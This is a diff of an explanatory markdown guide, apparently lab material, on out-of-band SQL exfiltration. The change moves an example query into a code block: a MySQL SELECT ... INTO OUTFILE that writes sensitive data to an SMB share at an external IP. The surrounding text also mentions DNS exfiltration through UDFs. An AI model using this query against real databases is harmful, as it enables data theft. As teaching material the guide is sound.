@@ -61,7 +61,11 @@ Attackers can use SQL queries to generate DNS requests with encoded data, which 
 As discussed above, MySQL does not natively support generating DNS requests through SQL commands alone, attackers might use other means such as custom User-Defined Functions (UDFs) or system-level scripts to perform DNS lookups.
 
 ### **SMB Exfiltration**
-SMB exfiltration involves writing query results to an SMB share on an external server. This technique is particularly effective in Windows environments but can also be configured in Linux systems with the right setup. an example query would look like `SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';`.
+SMB exfiltration involves writing query results to an SMB share on an external server. This technique is particularly effective in Windows environments but can also be configured in Linux systems with the right setup. an example query would look like:
+
+```sql
+SELECT sensitive_data INTO OUTFILE '\\\\10.10.162.175\\logs\\out.txt';
+```
 
 This is fully supported as Windows natively supports SMB/UNC paths. Linux (Ubuntu): While direct UNC paths are more native to Windows, SMB shares can be mounted and accessed in Linux using tools like `smbclient` or by mounting the share to a local directory. Directly using UNC paths in SQL queries may require additional setup or scripts to facilitate the interaction.
 
